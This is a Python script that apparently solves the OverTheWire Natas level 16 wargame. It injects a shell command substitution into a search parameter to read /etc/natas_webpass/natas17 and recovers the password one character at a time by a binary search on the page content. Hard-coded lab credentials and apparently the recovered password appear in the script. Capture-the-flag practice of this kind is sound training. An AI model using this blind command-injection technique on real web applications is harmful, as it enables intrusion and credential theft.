#!/bin/python3
# "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
import requests
import sys
import string

char = string.digits+string.ascii_uppercase+string.ascii_lowercase
MAX = len(char)
password_len = 32

urlstart = 'http://natas16.natas.labs.overthewire.org/index.php?needle=%24%28grep+%5E' 
urlend = '+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search'
matchStr = "African"

def isMatch(url):
	r = requests.get(url,auth=('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
	return (matchStr in r.text)


def binarySearch(start, end, current):
	if start == (end - 1):
		return char[start]

	mid = (start + end) // 2
	testStr = char[start:mid]
	url= urlstart + current + '%5B' + testStr + '%5D' + urlend

	if not(isMatch(url)):
		return binarySearch(start, mid, current)
	return binarySearch(mid, end, current)		
	
		
def main():
	searchStr = ""
	for pos in range(password_len):
		searchStr += binarySearch(0, MAX, searchStr)
		print (searchStr)
	print ("done")

main()
